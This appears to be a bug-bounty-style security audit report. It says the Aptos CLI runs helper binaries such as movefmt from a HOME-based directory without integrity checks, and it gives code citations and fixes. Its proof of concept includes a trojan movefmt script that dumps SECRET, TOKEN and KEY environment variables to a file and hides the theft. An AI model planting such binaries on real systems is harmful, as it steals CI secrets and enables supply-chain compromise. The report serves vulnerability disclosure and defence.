# Audit Report

## Title
CI/CD Supply Chain Attack via Untrusted Binary Execution in Aptos CLI

## Summary
The Aptos CLI's `get_additional_binaries_dir()` function returns a user-controlled directory path (`$HOME/.local/bin` on Linux/macOS, `%USERPROFILE%\.aptoscli\bin` on Windows) without any integrity verification. In CI/CD environments where HOME directories are shared or predictable, an attacker can pre-stage malicious binaries (movefmt, revela, boogie, z3, cvc5) that will be executed during automated builds or tests, leading to Remote Code Execution on developer machines and CI/CD infrastructure.

## Finding Description

The vulnerability exists in the binary resolution and execution flow: [1](#0-0) 

This function unconditionally trusts the HOME environment variable and returns a path under user control. When developers or CI systems execute commands like `aptos move fmt` or `aptos move decompile`, the binary lookup occurs through `get_path()`: [2](#0-1) 

The critical security flaw is at lines 93-95: if a binary exists at the path returned by `get_additional_binaries_dir()`, it is immediately trusted and returned without any integrity verification (no checksum validation, signature verification, or ownership checks).

These binaries are then executed directly: [3](#0-2) [4](#0-3) 

**Attack Scenario:**

1. **Attacker gains write access** to CI/CD environment's HOME directory through:
   - Malicious dependency executed during build process
   - Compromised CI configuration
   - Shared CI runners with predictable HOME paths
   - Malicious PR that modifies pre-build scripts

2. **Attacker pre-stages malicious binaries** at `$HOME/.local/bin/movefmt`, `$HOME/.local/bin/revela`, etc.

3. **Developer or CI executes** `aptos move fmt` or `aptos move decompile` during normal workflow

4. **Malicious binary executes** with full privileges of the CI/CD process, allowing:
   - Exfiltration of secrets (signing keys, API tokens)
   - Modification of build artifacts
   - Injection of backdoors into release binaries
   - Lateral movement within CI infrastructure

The attack succeeds because:
- No integrity verification mechanisms exist
- No file ownership or permission checks
- Environment variables (FORMATTER_EXE, REVELA_EXE, etc.) are checked first but are rarely set in practice
- The fallback to `get_additional_binaries_dir()` happens silently

## Impact Explanation

This qualifies as **High Severity** per Aptos bug bounty criteria, specifically:
- **Remote Code Execution on development/CI infrastructure**: Malicious binaries execute with full process privileges
- **Supply chain compromise**: Attackers can inject backdoors into Aptos releases, affecting all downstream users
- **Credential theft**: CI/CD secrets (signing keys, deployment credentials) can be exfiltrated

While this doesn't directly compromise validator nodes in production, it represents a critical supply chain vulnerability that could lead to:
- Compromised official Aptos CLI releases distributed to users
- Backdoored blockchain node software
- Theft of release signing keys, enabling impersonation of official releases

The impact extends beyond individual developers to the entire Aptos ecosystem if CI/CD infrastructure is compromised.

## Likelihood Explanation

**Likelihood: Medium to High** in modern CI/CD environments due to:

**Favorable Conditions for Attackers:**
- GitHub Actions, Jenkins, and other CI systems often use predictable HOME directories (`/home/runner`, `/home/jenkins`)
- Shared CI runners may reuse HOME directories between different projects/users
- Build processes frequently install dependencies that could contain malicious code
- Many projects run untrusted code (PR builds) in the same environment as trusted builds

**Real-World Attack Vectors:**
- Dependency confusion attacks to inject malicious build dependencies
- Compromised npm/cargo packages that execute during build
- Malicious PRs that modify `.github/workflows` or build scripts
- Insider threats with CI configuration access

The attack requires some initial compromise (write access to HOME), but this barrier is lower in CI/CD contexts than in production environments.

## Recommendation

Implement defense-in-depth measures:

**1. Verify Binary Integrity:**
```rust
pub fn get_path(
    name: &str,
    exe_env: &str,
    binary_name: &str,
    exe: &str,
    find_in_path: bool,
) -> Result<PathBuf> {
    // Look at the environment variable first (existing behavior)
    if let Ok(path) = std::env::var(exe_env) {
        return Ok(PathBuf::from(path));
    }

    // Check system PATH first (more trustworthy than HOME)
    if find_in_path {
        if let Some(path) = pathsearch::find_executable_in_path(exe) {
            // Verify it's not in user-writable directory
            if !is_user_writable_path(&path)? {
                return Ok(path);
            }
        }
    }

    // Only check user directory if binary was explicitly installed via aptos update
    let path = get_additional_binaries_dir().join(binary_name);
    if path.exists() && path.is_file() {
        // Verify checksum against known-good hash
        verify_binary_integrity(&path, binary_name)?;
        // Verify file ownership and permissions
        verify_safe_permissions(&path)?;
        return Ok(path);
    }

    // Fail securely
    Err(anyhow!("Cannot locate trusted {} executable", name))
}
```

**2. Store and verify checksums** when downloading binaries via `aptos update`:
- Download checksum file from GitHub releases
- Verify signature on checksum file
- Store checksums in secure location (not in HOME)
- Verify on each execution

**3. Add file permission checks:**
- Verify binary is not world-writable
- Check ownership matches current user
- Warn if located in shared/temp directories

**4. Prioritize system PATH** over HOME directory for better security

**5. Document security model** and recommend setting environment variables in CI:
```yaml
env:
  FORMATTER_EXE: /usr/local/bin/movefmt  # System-installed, read-only location
```

## Proof of Concept

**Step 1: Setup CI environment simulation**
```bash
# Simulate shared CI HOME
export HOME=/tmp/shared-ci-home
mkdir -p $HOME/.local/bin

# Create malicious binary
cat > $HOME/.local/bin/movefmt << 'EOF'
#!/bin/bash
echo "[EXPLOIT] Malicious movefmt executed!"
echo "[EXPLOIT] Current user: $(whoami)"
echo "[EXPLOIT] Environment: $@"
# Exfiltrate secrets
env | grep -E "SECRET|TOKEN|KEY" > /tmp/stolen-secrets.txt
# Execute actual formatting to avoid detection
/usr/bin/movefmt "$@" 2>/dev/null || true
EOF
chmod +x $HOME/.local/bin/movefmt
```

**Step 2: Trigger vulnerability**
```bash
# Developer/CI runs normal formatting command
cd /path/to/aptos/move/package
aptos move fmt --package-path .

# Output shows:
# [EXPLOIT] Malicious movefmt executed!
# [EXPLOIT] Current user: ci-runner
# ... malicious activity occurs ...
```

**Step 3: Verify compromise**
```bash
cat /tmp/stolen-secrets.txt
# Shows exfiltrated CI secrets
```

**Rust Test to Verify Vulnerability:**
```rust
#[test]
fn test_untrusted_binary_execution() {
    use std::env;
    use std::fs;
    use std::os::unix::fs::PermissionsExt;
    
    let temp_home = tempfile::tempdir().unwrap();
    env::set_var("HOME", temp_home.path());
    
    let bin_dir = temp_home.path().join(".local/bin");
    fs::create_dir_all(&bin_dir).unwrap();
    
    // Create malicious binary
    let malicious_bin = bin_dir.join("movefmt");
    fs::write(&malicious_bin, "#!/bin/bash\necho EXPLOITED").unwrap();
    fs::set_permissions(&malicious_bin, fs::Permissions::from_mode(0o755)).unwrap();
    
    // get_movefmt_path() will return the malicious binary
    let result = get_movefmt_path();
    assert!(result.is_ok());
    assert_eq!(result.unwrap(), malicious_bin);
    
    // No integrity checks prevent this from being executed
}
```

## Notes

This vulnerability represents a **supply chain security gap** in the Aptos CLI tooling. While not a direct blockchain protocol vulnerability, it poses significant risk to the Aptos ecosystem's integrity through potential compromise of:
- Official releases
- Developer environments  
- CI/CD infrastructure
- Code signing keys

The lack of any integrity verification mechanisms (checksums, signatures, or even basic permission checks) makes this a straightforward attack vector for sophisticated adversaries targeting cryptocurrency projects.

### Citations

**File:** crates/aptos/src/update/helpers.rs (L9-21)
```rust
pub fn get_additional_binaries_dir() -> PathBuf {
    #[cfg(windows)]
    {
        let home_dir = std::env::var("USERPROFILE").unwrap_or_else(|_| "".into());
        PathBuf::from(home_dir).join(".aptoscli/bin")
    }

    #[cfg(not(windows))]
    {
        let home_dir = std::env::var("HOME").unwrap_or_else(|_| "".into());
        PathBuf::from(home_dir).join(".local/bin")
    }
}
```

**File:** crates/aptos/src/update/update_helper.rs (L80-96)
```rust
pub fn get_path(
    name: &str,
    exe_env: &str,
    binary_name: &str,
    exe: &str,
    find_in_path: bool,
) -> Result<PathBuf> {
    // Look at the environment variable first.
    if let Ok(path) = std::env::var(exe_env) {
        return Ok(PathBuf::from(path));
    }

    // See if it is present in the path where we usually install additional binaries.
    let path = get_additional_binaries_dir().join(binary_name);
    if path.exists() && path.is_file() {
        return Ok(path);
    }
```

**File:** crates/aptos/src/move_tool/fmt.rs (L80-89)
```rust
    async fn execute(self) -> CliTypedResult<String> {
        let exe = get_movefmt_path()?;
        let package_opt = self.package_path;
        let config_path_opt = self.config_path;
        let files_opt = self.file_path;
        let config_map = self.config;
        let verbose_flag = self.verbose;
        let quiet_flag = self.quiet;
        let create_cmd = || {
            let mut cmd = Command::new(exe.as_path());
```

**File:** crates/aptos/src/move_tool/bytecode.rs (L512-527)
```rust
    fn decompile_v1(&self, bytecode_path: &Path) -> Result<String, CliError> {
        let exe = get_revela_path()?;
        let to_cli_error = |e| CliError::IO(exe.display().to_string(), e);
        let mut cmd = Command::new(exe.as_path());
        // WORKAROUND: if the bytecode is v7, try to downgrade to v6 since Revela
        // does not support v7
        let v6_temp_file = self.downgrade_to_v6(bytecode_path)?;
        if let Some(file) = &v6_temp_file {
            cmd.arg(format!("--bytecode={}", file.path().display()));
        } else {
            cmd.arg(format!("--bytecode={}", bytecode_path.display()));
        }
        if self.is_script {
            cmd.arg("--script");
        }
        let out = cmd.output().map_err(to_cli_error)?;
```
